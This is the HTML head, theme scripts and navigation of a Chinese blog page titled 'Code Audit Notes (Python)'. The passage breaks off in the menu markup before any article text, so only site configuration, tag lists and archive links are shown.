<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>代码审计笔记（Python） | 空天之境</title><noscript>开启JavaScript才能访问本站哦~</noscript><link rel="icon" href="/img/favicon.ico"><!-- index.css--><link rel="stylesheet" href="/css/index.css?v=2.1.12"><!-- inject head--><link rel="canonical" href="https://blog.w0xking.us.kg/posts/e7654e82.html"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"><!-- aplayer--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.css"><!-- swiper--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.css"><!-- fancybox ui--><!-- katex--><!-- Open Graph--><meta name="description" content="总结一些常见代码中不安全的写法"><!-- pwa--><meta name="apple-mobile-web-app-capable" content="空天之境"><meta name="theme-color" content="var(--efu-main)"><meta name="apple-mobile-web-app-status-bar-style" content="var(--efu-main)"><link rel="bookmark" href="/img/favicon.ico"><link rel="apple-touch-icon" href="/img/favicon.ico" sizes="180x180"><script>console.log(' %c Solitude %c ' + '2.1.12' + ' %c https://github.com/everfu/hexo-theme-solitude',
    'background:#35495e ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff',
    'background:#ff9a9a ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff',
    'background:unset ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff')
</script><script>let mdate = "7-7,9-18,9-30,12-13";
mdate = (mdate.split(","));
let ndate = new Date();
for (let i of mdate) {
    if (i === (ndate.getMonth()+1) + "-" + (ndate.getDate())) {
        document.documentElement.classList.add('memorial');
    }
}
</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.css"><link rel="stylesheet" href="/css/message_us_font.css"><script>(()=>{
        const saveToLocal = {
            set: function setWithExpiry(key, value, ttl) {
                if (ttl === 0)
                    return
                const now = new Date()
                const expiryDay = ttl * 86400000
                const item = {
                    value: value,
                    expiry: now.getTime() + expiryDay
                }
                localStorage.setItem(key, JSON.stringify(item))
            },
            get: function getWithExpiry(key) {
                const itemStr = localStorage.getItem(key)

                if (!itemStr) {
                    return undefined
                }
                const item = JSON.parse(itemStr)
                const now = new Date()

                if (now.getTime() > item.expiry) {
                    localStorage.removeItem(key)
                    return undefined
                }
                return item.value
            }
        };
        window.utils = {
            saveToLocal: saveToLocal,
            getCSS: (url, id = false) => new Promise((resolve, reject) => {
              const link = document.createElement('link')
              link.rel = 'stylesheet'
              link.href = url
              if (id) link.id = id
              link.onerror = reject
              link.onload = link.onreadystatechange = function() {
                const loadState = this.readyState
                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
                link.onload = link.onreadystatechange = null
                resolve()
              }
              document.head.appendChild(link)
            }),
            getScript: (url, attr = {}) => new Promise((resolve, reject) => {
              const script = document.createElement('script')
              script.src = url
              script.async = true
              script.onerror = reject
              script.onload = script.onreadystatechange = function() {
                const loadState = this.readyState
                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
                script.onload = script.onreadystatechange = null
                resolve()
              }

              Object.keys(attr).forEach(key => {
                script.setAttribute(key, attr[key])
              })

              document.head.appendChild(script)
            }),
            addGlobalFn: (key, fn, name = false, parent = window) => {
                const globalFn = parent.globalFn || {}
                const keyObj = globalFn[key] || {}

                if (name && keyObj[name]) return

                name = name || Object.keys(keyObj).length
                keyObj[name] = fn
                globalFn[key] = keyObj
                parent.globalFn = globalFn
            },
            addEventListenerPjax: (ele, event, fn, option = false) => {
              ele.addEventListener(event, fn, option)
              utils.addGlobalFn('pjax', () => {
                  ele.removeEventListener(event, fn, option)
              })
          },
        }
    })()</script><!-- theme--><script>initTheme = () => {
    let isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const cachedMode = utils.saveToLocal.get('theme');
    if (cachedMode === undefined) {
        const nowMode =
            isDarkMode ? 'dark' : 'light'
        document.documentElement.setAttribute('data-theme', nowMode);
    } else {
        document.documentElement.setAttribute('data-theme', cachedMode);
    }
    typeof rm === 'object' && rm.mode(cachedMode === 'dark' && isDarkMode)
}
initTheme()</script><!-- global head--><script>const GLOBAL_CONFIG = {
    root: '/',
    algolia: undefined,
    localsearch: {"preload":true,"path":"/search.xml"},
    runtime: '2021-06-30 00:00:00',
    lazyload: {
        enable: true,
        error: '/img/error_load.avif'
    },
    copyright: {"limit":20,"author":"作者: SkyKing","link":"链接: ","source":"来源: 空天之境","info":"著作权归作者所有。 商业转载请联系作者获得授权，非商业转载请注明出处。"},
    highlight: {"limit":200,"expand":true,"copy":true,"syntax":"highlight.js"},
    randomlink: true,
    lang: {"theme":{"dark":"已切换至深色模式","light":"已切换至浅色模式"},"copy":{"success":"复制成功","error":"复制失败"},"backtop":"返回顶部","time":{"day":"天前","hour":"小时前","just":"刚刚","min":"分钟前","month":"个月前"},"day":" 天","f12":"开发者模式已打开，请遵循GPL协议。","totalk":"无需删除空行，直接输入评论即可","search":{"empty":"找不到你查询的内容：${query}","hit":"找到 ${hits} 条结果，用时 ${time} 毫秒","placeholder":"输入关键词快速查找","count":"共 <b>${count}</b> 条结果。","loading":"搜索中..."},"barrage":{"title":"热评"}},
    aside: {
        sayhello: {
            morning: "✨ 早上好，新的一天开始了",
            noon: "🍲 午餐时间",
            afternoon: "🌞 下午好",
            night: "早点休息",
            goodnight: "晚安 😴",
        },
        sayhello2: ["你可以的","你一定可以的","祝你好运，陌生人"],
        sayhello3: {
            prefix: '好久不见，',
            back: '欢迎再次回来，',
        },
    },
    covercolor: {
        enable: true
    },
    comment: {"avatar":"https://gravatar.com/avatar","commentBarrage":true},
    lightbox: 'mediumZoom',
    post_ai: {"key":"66UsY6V7Qd8","talk":"我是 SkyKing 开发的摘要生成助理SkyKing AI，我在这里只负责已经生成的摘要显示，你无法与我直接沟通，但我可以回答一些预设的问题。","randomPost":false},
    right_menu: {"mode":{"dark":"深色模式","light":"浅色模式"},"img_error":"此图片无法复制与下载","music":{"start":"播放音乐","stop":"暂停音乐"},"barrage":{"open":"显示热评","close":"关闭热评"},"translate":false,"ctrlOriginalMenu":"按住Ctrl+右键可打开浏览器右键菜单"},
    translate: {"translateDelay":0,"defaultEncoding":2},
    lure: {"jump":"w(ﾟДﾟ)w 不要走！再看看嘛！","back":"♪(^∇^*)欢迎肥来！"},
    expire: false,
};</script><!-- page-config head--><script id="config-diff">var PAGE_CONFIG = {
    is_post: true,
    is_page: false,
    is_home: false,
    page: '',
    toc: true,
    comment: true,
    ai_text: false,
    color: false,
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="空天之境" type="application/atom+xml">
</head><body id="body"><!-- universe--><canvas id="universe"></canvas><!-- background img--><div id="global_bg"></div><!-- loading--><!-- console--><div id="console"><div class="close-btn" onclick="sco.hideConsole()"><i class="solitude fa-solid fa-xmark"></i></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments" onclick="sco.hideConsole()"><div class="card-content"><div class="author-content-item-tips">互动</div><div class="author-content-item-title">最新评论<a class="recent-comment-more" href="/recentcomments/" title="最近评论"><i class="solitude fa-solid fa-circle-chevron-right"></i></a></div></div><div class="console_recentcomments"><script pjax="">(async () => {
    document.querySelector('.console-card .console_recentcomments').textContent = `加载中...`
    const emojiReg = /<img class="tk-owo-emotion" [^>]+>/g
    let cache = utils.saveToLocal.get('twikoo-recent-comments-console')
    if (cache) {
        setHtml(document.querySelector('.console-card .console_recentcomments'), cache)
        return
    }
    let ls = []

    await fetch('https://twikoo.w0xking.us.kg/', {
        method: "POST",
        body: JSON.stringify({
            "event": "GET_RECENT_COMMENTS",
            "includeReply": true,
            "pageSize": 6
        }),
        headers: {'Content-Type': 'application/json'}
    }).then(res => res.json()).then(async ({data}) => {
        for (const i of data) {
            if (i.avatar === undefined) i.avatar = '/avatar/d615d5793929e8c7d70eab5f00f7f5f1?d=mp'
            let title = ''
            if (i.url) {
                await fetch(i.url).then(res => res.text()).then(html => {
                    const parser = new DOMParser()
                    const doc = parser.parseFromString(html, 'text/html')
                    title = doc.querySelector('title').innerText
                }).catch(() => {
                    title = i.url
                })
            }
            if (title.indexOf('|') > 0) {
                title = title.split('|')[0]
            }
            ls.push({
                avatar: i.avatar,
                nick: i.nick,
                title: title,
                content: i.comment,
                url: i.url + '#' + i.id,
                time: i.created
            })
        }
        setHtml(document.querySelector('.console-card .console_recentcomments'), ls)
        utils.saveToLocal.set('twikoo-recent-comments-console', ls, 0.2)
    });

    function setHtml(el, data) {
        el.innerHTML = data.map(i => `
            <div class="comment-card" title="${i.title}" onclick="pjax.loadUrl('${i.url}')">
                <div class="comment-info">
                    <img src="${i.avatar}" class="nolazyload" alt="${i.nick}">
                    <div>
                        <span class="comment-user">${i.nick}</span>
                    </div>
                    <time class="comment-time" datetime="${new Date(i.time)}"></time>
                </div>
                <div class="comment-content">${formatContent(i.content)}</div>
                <div class="comment-title">
                <i class="solitude fa-solid fa-comment"></i>
                ${i.title}</div>
            </div>
        `).join('')
        if (typeof sco !== 'undefined') sco.changeTimeFormat(document.querySelectorAll('.comment-time'))
        else {
            document.addEventListener('pjax:complete', () => sco.changeTimeFormat(document.querySelectorAll('.comment-time')))
            document.addEventListener('DOMContentLoaded', () => sco.changeTimeFormat(document.querySelectorAll('.comment-time')))
        }
    }

    function formatContent(content) {
        content = content.replace(emojiReg, '表情')
        content = content.replace(/<\/*br>|[\s\uFEFF\xA0]+/g, '');
        content = content.replace(/<img.*?>/g, '[图片]');
        content = content.replace(/<a.*?>.*?<\/a>/g, '[链接]');
        content = content.replace(/<pre.*?>.*?<\/pre>/g, '[代码]');
        content = content.replace(/<.*?>/g, '');
        return content
    }
})()</script></div></div></div><div class="console-card-group-right"><div class="console-card tags" onclick="sco.hideConsole()"><div class="card-content"><div class="author-content-item-tips">标签</div><div class="author-content-item-title">寻找感兴趣的领域</div></div><div class="card-tag-cloud"><a href="/tags/%E6%95%99%E7%A8%8B/">教程<sup>1</sup></a><a href="/tags/argo/">argo<sup>1</sup></a><a href="/tags/AI/">AI<sup>1</sup></a><a href="/tags/%E4%BA%A4%E4%BA%92/">交互<sup>1</sup></a><a href="/tags/%E6%91%98%E8%A6%81/">摘要<sup>1</sup></a><a href="/tags/Hexo/">Hexo<sup>8</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/">博客<sup>9</sup></a><a href="/tags/Markdown%E8%AF%AD%E6%B3%95/">Markdown语法<sup>1</sup></a><a href="/tags/%E7%83%AD%E9%97%A8/">热门<sup>3</sup></a><a href="/tags/Markdown/">Markdown<sup>1</sup></a><a href="/tags/%E5%8A%A0%E5%AF%86/">加密<sup>2</sup></a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/">密码<sup>1</sup></a><a href="/tags/%E6%8E%A8%E8%8D%90/">推荐<sup>4</sup></a><a href="/tags/%E5%9F%9F%E5%90%8D/">域名<sup>1</sup></a><a href="/tags/github-action/">github action<sup>1</sup></a><a href="/tags/live2d/">live2d<sup>1</sup></a><a href="/tags/ip%E5%BB%B6%E6%97%B6/">ip延时<sup>1</sup></a><a href="/tags/ip%E6%B5%8B%E9%80%9F/">ip测速<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞<sup>1</sup></a><a href="/tags/poc/">poc<sup>1</sup></a><a href="/tags/%E7%BA%AA%E5%BE%8B%E5%A4%84%E5%88%86%E6%9D%A1%E4%BE%8B/">纪律处分条例<sup>1</sup></a><a href="/tags/%E5%AE%A1%E8%AE%A1/">审计<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/">代码安全<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E8%AF%88%E9%AA%97/">网络诈骗<sup>1</sup></a><a href="/tags/%E7%94%B5%E4%BF%A1%E8%AF%88%E9%AA%97/">电信诈骗<sup>1</sup></a><a href="/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/">外挂标签<sup>1</sup></a><a href="/tags/%E8%A5%BF%E5%8C%97%E5%A4%A7%E5%AD%A6/">西北大学<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E4%B8%AD%E5%BF%83/">网络中心<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E8%A1%8C%E4%B8%BA/">网络行为<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E4%BD%9C%E7%94%A8/">网络空间作用<sup>1</sup></a><a href="/tags/%E9%81%93%E5%AD%A6/">道学<sup>1</sup></a><a href="/tags/%E7%BB%8F%E5%85%B8/">经典<sup>1</sup></a></div></div><div class="console-card history" onclick="sco.hideConsole()"><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/02/"><span class="card-archive-list-date">2025/02</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/01/"><span class="card-archive-list-date">2025/01</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">2024/11</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/10/"><span class="card-archive-list-date">2024/10</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/09/"><span class="card-archive-list-date">2024/09</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">2024/08</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">2024/06</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">2024/03</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">2024/01</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/05/"><span class="card-archive-list-date">2022/05</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/04/"><span class="card-archive-list-date">2022/04</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/01/"><span class="card-archive-list-date">2022/01</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/05/"><span class="card-archive-list-date">2021/05</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/04/"><span class="card-archive-list-date">2021/04</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/03/"><span class="card-archive-list-date">2021/03</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">2021/01</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span class="card-archive-list-count-unit">篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/"><span class="card-archive-list-date">全部文章</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">24</span><span class="card-archive-list-count-unit">篇</span></div></a></li></ul></div></div></div><div class="button-group"><div class="console-btn-item"><span class="darkmode_switchbutton" onclick="sco.switchDarkMode()" title="昼夜切换"><i class="solitude fa-solid fa-circle-half-stroke"></i></span></div><div class="console-btn-item" id="consoleHideAside"><span class="asideSwitch" onclick="sco.switchHideAside()" title="边栏显示控制"><i class="solitude fas fa-arrows-left-right-to-line"></i></span></div><div class="console-btn-item" id="consoleMusic" onclick="sco.musicToggle()"><span class="music-switch" title="音乐开关"><i class="solitude fa-solid fa-compact-disc"></i></span></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="sco.switchCommentBarrage()"><span class="commentBarrage"><i class="solitude fa-solid fa-comment"></i></span></div></div><div class="console-mask" onclick="sco.hideConsole()"></div></div><!-- sidebar--><div id="sidebar" style="zoom: 1;"><div id="menu-mask" style="display: none;"></div><div id="sidebar-menus"><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div></div></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><span class="darkmode_switchbutton menu-child" onclick="sco.switchDarkMode()"><i class="solitude fa-solid fa-circle-half-stroke"></i><span>显示模式</span></span></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">我的</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.skyking.us.kg/" title="个人主页"><img class="nolazyload back-menu-item-icon" src="https://img.skyking.us.kg/file/1741260241065_02_1x.png" alt="个人主页"><span class="back-menu-item-text">个人主页</span></a><a class="back-menu-item" href="https://blog.w0xking.us.kg/" title="博客"><img class="nolazyload back-menu-item-icon" src="https://img.skyking.us.kg/file/1741260238499_02_2x.png" alt="博客"><span class="back-menu-item-text">博客</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://cdn.w0xking.us.kg/" title="换线"><img class="nolazyload back-menu-item-icon" src="https://api.qjqq.cn/api/Img" alt="换线"><span class="back-menu-item-text">换线</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://news.skyking.us.kg/" title="新闻"><img class="nolazyload back-menu-item-icon" src="https://news.skyking.us.kg/icon.svg" alt="新闻"><span class="back-menu-item-text">新闻</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">使用的项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS8=" title="测速"><img class="nolazyload back-menu-item-icon" src="https://speed.cloudflare.com/static/img/speedrabbit-static.png" alt="测速"><span class="back-menu-item-text">测速</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9hcGkucWpxcS5jbi8=" title="青桔气球API"><img class="nolazyload back-menu-item-icon" src="https://api.qjqq.cn/assets/img/favicons/favicon.ico" alt="青桔气球API"><span class="back-menu-item-text">青桔气球API</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9hcGkubnNtYW8ubmV0" title="奶思猫API"><img class="nolazyload back-menu-item-icon" src="https://api.nsmao.net/assets/img/%E5%A5%B6%E6%80%9D%E7%8C%ABico.svg" alt="奶思猫API"><span class="back-menu-item-text">奶思猫API</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly93d3cubW9uZ29kYi5jb20vemgtY24=" title="mongodb"><img class="nolazyload back-menu-item-icon" src="https://www.mongodb.com/assets/images/global/favicon.ico" alt="mongodb"><span class="back-menu-item-text">mongodb</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>全部文章</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>分类列表</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>标签列表</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-tools"></i><span>我的装备</span></a></li><li><a class="site-page child" href="/gallery/"><i class="solitude  fas fa-images"></i><span>照片</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="solitude  fas fa-video"></i><span>追番</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>朋友圈</span></a><ul class="menus_item_child"><li><a class="site-page child" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zdW1tYXJ5LnpoaGVvLmNvbS9zdGF0aWMvbWF0cml4LXBvc3RzLmh0bWw="><i class="solitude  fas fa-wifi"></i><span>文章矩阵</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>友情链接</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>宝藏博主</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>其他</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/message/"><i class="solitude  far fa-file-alt"></i><span>留言</span></a></li><li><a class="site-page child" href="/about/"><i class="solitude  fas fa-user"></i><span>关于本站</span></a></li><li><a class="site-page child" href="/privacy/"><i class="solitude  fas fa-user-shield"></i><span>声明</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-widget card-tags card-archives card-webinfo card-allinfo"><div class="card-tag-cloud"><a href="/tags/%E6%95%99%E7%A8%8B/">教程<sup>1</sup></a><a href="/tags/argo/">argo<sup>1</sup></a><a href="/tags/AI/">AI<sup>1</sup></a><a href="/tags/%E4%BA%A4%E4%BA%92/">交互<sup>1</sup></a><a href="/tags/%E6%91%98%E8%A6%81/">摘要<sup>1</sup></a><a href="/tags/Hexo/">Hexo<sup>8</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/">博客<sup>9</sup></a><a href="/tags/Markdown%E8%AF%AD%E6%B3%95/">Markdown语法<sup>1</sup></a><a href="/tags/%E7%83%AD%E9%97%A8/">热门<sup>3</sup></a><a href="/tags/Markdown/">Markdown<sup>1</sup></a><a href="/tags/%E5%8A%A0%E5%AF%86/">加密<sup>2</sup></a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/">密码<sup>1</sup></a><a href="/tags/%E6%8E%A8%E8%8D%90/">推荐<sup>4</sup></a><a href="/tags/%E5%9F%9F%E5%90%8D/">域名<sup>1</sup></a><a href="/tags/github-action/">github action<sup>1</sup></a><a href="/tags/live2d/">live2d<sup>1</sup></a><a href="/tags/ip%E5%BB%B6%E6%97%B6/">ip延时<sup>1</sup></a><a href="/tags/ip%E6%B5%8B%E9%80%9F/">ip测速<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E/">漏洞<sup>1</sup></a><a href="/tags/poc/">poc<sup>1</sup></a><a href="/tags/%E7%BA%AA%E5%BE%8B%E5%A4%84%E5%88%86%E6%9D%A1%E4%BE%8B/">纪律处分条例<sup>1</sup></a><a href="/tags/%E5%AE%A1%E8%AE%A1/">审计<sup>1</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8/">代码安全<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E8%AF%88%E9%AA%97/">网络诈骗<sup>1</sup></a><a href="/tags/%E7%94%B5%E4%BF%A1%E8%AF%88%E9%AA%97/">电信诈骗<sup>1</sup></a><a href="/tags/%E5%A4%96%E6%8C%82%E6%A0%87%E7%AD%BE/">外挂标签<sup>1</sup></a><a href="/tags/%E8%A5%BF%E5%8C%97%E5%A4%A7%E5%AD%A6/">西北大学<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E4%B8%AD%E5%BF%83/">网络中心<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E8%A1%8C%E4%B8%BA/">网络行为<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E4%BD%9C%E7%94%A8/">网络空间作用<sup>1</sup></a><a href="/tags/%E9%81%93%E5%AD%A6/">道学<sup>1</sup></a><a href="/tags/%E7%BB%8F%E5%85%B8/">经典<sup>1</sup></a></div></div></div></div><!-- keyboard--><!-- righhtside--><div class="needEndHide" id="rightside"><div class="rs_hide"><button class="mode" type="button" title="显示模式切换" onclick="sco.switchDarkMode()"><i class="fas fa-circle-half-stroke"></i></button><button class="aside pc" type="button" title="侧边栏" onclick="sco.switchHideAside()"><i class="fas fa-arrows-alt-h"></i></button></div><div class="rs_show"><button class="config" type="button" title="扩展" onclick="document.querySelector(&quot;.rs_hide&quot;).classList.toggle(&quot;show&quot;)"><i class="fas fa-gear fa-spin"></i></button><button class="mobile toc" type="button" title="目录" onclick="document.querySelector('#card-toc').classList.toggle('open')"><i class="fas fa-list"></i></button><button class="comment" type="button" title="评论" onclick="sco.scrollTo('post-comment')"><i class="fas fa-comment"></i></button><button class="barrage pc" type="button" title="弹" onclick="sco.switchCommentBarrage()"><span>弹</span></button><button class="top" type="button" title="返回顶部" onclick="sco.toTop()"><i class="fas fa-arrow-up"></i><span id="percent">0</span></button></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav class="show" id="nav"><div id="nav-group"><div id="blog_name"><div class="back-home-button" tabindex="-1"><i class="back-home-button-icon solitude fas fa-bars-progress"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">我的</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.skyking.us.kg/" title="个人主页"><img class="nolazyload back-menu-item-icon" src="https://img.skyking.us.kg/file/1741260241065_02_1x.png" alt="个人主页"><span class="back-menu-item-text">个人主页</span></a><a class="back-menu-item" href="https://blog.w0xking.us.kg/" title="博客"><img class="nolazyload back-menu-item-icon" src="https://img.skyking.us.kg/file/1741260238499_02_2x.png" alt="博客"><span class="back-menu-item-text">博客</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://cdn.w0xking.us.kg/" title="换线"><img class="nolazyload back-menu-item-icon" src="https://api.qjqq.cn/api/Img" alt="换线"><span class="back-menu-item-text">换线</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://news.skyking.us.kg/" title="新闻"><img class="nolazyload back-menu-item-icon" src="https://news.skyking.us.kg/icon.svg" alt="新闻"><span class="back-menu-item-text">新闻</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">使用的项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS8=" title="测速"><img class="nolazyload back-menu-item-icon" src="https://speed.cloudflare.com/static/img/speedrabbit-static.png" alt="测速"><span class="back-menu-item-text">测速</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9hcGkucWpxcS5jbi8=" title="青桔气球API"><img class="nolazyload back-menu-item-icon" src="https://api.qjqq.cn/assets/img/favicons/favicon.ico" alt="青桔气球API"><span class="back-menu-item-text">青桔气球API</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly9hcGkubnNtYW8ubmV0" title="奶思猫API"><img class="nolazyload back-menu-item-icon" src="https://api.nsmao.net/assets/img/%E5%A5%B6%E6%80%9D%E7%8C%ABico.svg" alt="奶思猫API"><span class="back-menu-item-text">奶思猫API</span></a><a class="back-menu-item" target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?king=aHR0cHM6Ly93d3cubW9uZ29kYi5jb20vemgtY24=" title="mongodb"><img class="nolazyload back-menu-item-icon" src="https://www.mongodb.com/assets/images/global/favicon.ico" alt="mongodb"><span class="back-menu-item-text">mongodb</span></a></div></div></div></div><a id="site-name" href="/" title="返回博客主页"><span class="title">空天之境</span><i class="solitude fa-solid fa-home"></i></a></div><div id="page-name-mask"><div id="page-name"><a id="page-name-text" onclick="sco.toTop()">代码审计笔记（Python）</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div 